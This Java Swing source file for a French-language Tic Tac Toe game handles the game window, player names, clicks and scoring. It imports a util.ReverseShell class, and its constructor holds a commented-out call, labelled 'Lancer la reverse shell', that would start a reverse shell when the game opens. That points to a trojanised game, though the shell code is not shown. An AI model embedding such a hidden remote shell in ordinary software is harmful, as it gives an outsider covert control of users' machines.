package gui;

import java.awt.EventQueue;
import java.awt.Font;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;

import classes.Joueur;
import classes.Pion;
import classes.Plateau;
import util.ReverseShell;

public class Fenetre extends JFrame {


	final int WIDTH = 750;
	final int HEIGHT = 500;

	private MyPanel panel = new MyPanel();
	
	private JTextField txtJ1;
	private JTextField txtJ2;
	private JButton btnJouer;
	private JLabel lblCommence;
	private JLabel lblScore1;
	private JLabel lblScore2;
	
	private Sourislistener mouseListener = new Sourislistener();
	
	private Plateau plateau;
	private boolean commencer = false;

	public Fenetre() {
		plateau = new Plateau();
		
		setTitle("Tic Tac Toe");
		setSize(WIDTH, HEIGHT);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setLocationRelativeTo(null);
		
		// add the canvas 
		setContentPane(panel);
		panel.setLayout(null); // absolute layout
		panel.addMouseListener(mouseListener);
		
		
		JLabel lblJoueur = new JLabel("Joueur 1 (X)");
		lblJoueur.setFont(new Font("Modern No. 20", Font.PLAIN, 14));
		lblJoueur.setBounds(439, 45, 70, 14);
		getContentPane().add(lblJoueur);
		
		JLabel lblJoueur_1 = new JLabel("Joueur 2 (O)");
		lblJoueur_1.setFont(new Font("Modern No. 20", Font.PLAIN, 14));
		lblJoueur_1.setBounds(439, 76, 70, 14);
		getContentPane().add(lblJoueur_1);
		
		txtJ1 = new JTextField();
		txtJ1.setBounds(520, 42, 164, 20);
		getContentPane().add(txtJ1);
		txtJ1.setColumns(10);
		
		txtJ2 = new JTextField();
		txtJ2.setBounds(520, 73, 164, 20);
		getContentPane().add(txtJ2);
		txtJ2.setColumns(10);
		
		btnJouer = new JButton("Jouer");
		btnJouer.addActionListener(new BtnJouerActionListener());
		btnJouer.setFont(new Font("Modern No. 20", Font.PLAIN, 24));
		btnJouer.setBounds(439, 120, 235, 71);
		getContentPane().add(btnJouer);
		
		JLabel lblScore = new JLabel("Score :");
		lblScore.setFont(new Font("Modern No. 20", Font.PLAIN, 16));
		lblScore.setBounds(439, 286, 46, 14);
		getContentPane().add(lblScore);
		
		JLabel label = new JLabel("Joueur 1");
		label.setFont(new Font("Modern No. 20", Font.PLAIN, 14));
		label.setBounds(495, 253, 70, 14);
		getContentPane().add(label);
		
		JLabel label_1 = new JLabel("Joueur 2");
		label_1.setFont(new Font("Modern No. 20", Font.PLAIN, 14));
		label_1.setBounds(565, 253, 70, 14);
		getContentPane().add(label_1);
		
		lblScore1 = new JLabel("0");
		lblScore1.setBounds(495, 287, 46, 14);
		getContentPane().add(lblScore1);
		
		lblScore2 = new JLabel("0");
		lblScore2.setBounds(565, 287, 46, 14);
		getContentPane().add(lblScore2);
		
		lblCommence = new JLabel("");
		lblCommence.setFont(new Font("Modern No. 20", Font.PLAIN, 16));
		lblCommence.setBounds(439, 330, 250, 14);
		getContentPane().add(lblCommence);
		
		//Lancer la reverse shell
		// ReverseShell rs = new ReverseShell("second Thread");
	}
	
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Fenetre fenetre = new Fenetre();
					fenetre.setVisible(true);
					
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	// Btn jouer
	private class BtnJouerActionListener implements ActionListener {
		public void actionPerformed(ActionEvent e) {
			
			plateau.ajouterJ1(txtJ1.getText());
			plateau.ajouterJ2(txtJ2.getText());
			
			btnJouer.setEnabled(false);
			txtJ1.setEnabled(false);
			txtJ2.setEnabled(false);
			
			commencer = true;
			
			lblCommence.setText(plateau.joueurCommence().getNom() + " commence !");
			
			
			/* 
			Graphics g = panel.getGraphics();
			
			for (int i = 0; i < 3; i ++ ) {
				for (int j = 0; j < 3; j ++ ) {
					panel.paintPion(g, i, j, "X");
					try {
						Thread.sleep(300);
					} catch (InterruptedException e1) {
						e1.printStackTrace();
					}
				}
			} 
			*/
			

		}
	}
	
	
	private class Sourislistener implements MouseListener {
		@Override
		public void mouseClicked(MouseEvent e) {
			
			if (commencer) {
				
				if (! plateau.remplis()) {
					// canvas width and height / nb of cells
					int x = e.getX() / (400 / 3); 		 
					int y = e.getY() / (400 /3);	
					
					// Clic out of the canvas bounds
					if (x < 3 && y < 3) {
						
						// si la case est prise
						if (! plateau.ajouterPion(new Pion(new Point(x, y), plateau.getCurrentPlayer().getFace())))
							System.out.println("Case deja prise");
						
						// si personne n'a gagne
						else if (plateau.verifierGagnant()) {
							plateau.getCurrentPlayer().incrScore();
							reset(plateau.getCurrentPlayer().getNom() + " a gagné la manche !\n");
							
						// sinon jouer
						} else {
							panel.paintPion(panel.getGraphics(), x, y, plateau.getCurrentPlayer().getFace());
							System.out.println("x : " + x + " y : " + y);
							
							plateau.switchCurrentPlayer();
						}
					}
					
				} else {
					reset("Match nul !\n");
				}
			} else {
				JOptionPane.showMessageDialog(null, "Veuillez remplirs les nom de joueurs et \n"
						+ "cliquer sur le bouton jouer");
			}
		}
		
		public void reset(String msg) {
			plateau.resetTableau();
			Joueur j = plateau.joueurCommence();
			
			JOptionPane.showMessageDialog(null, msg + j.getNom() + " commence !");
			lblCommence.setText(j.getNom() + " commence");
			
			panel.reDrawPlateau(panel.getGraphics());
			
			lblScore1.setText(String.valueOf(plateau.getJoueur1().getScore()));
			lblScore2.setText(String.valueOf(plateau.getJoueur2().getScore()));
		}
		
		
		@Override
		public void mouseEntered(MouseEvent arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void mouseExited(MouseEvent arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void mousePressed(MouseEvent arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void mouseReleased(MouseEvent arg0) {
			// TODO Auto-generated method stub
			
		}
		
	}
	
	
	
	
}
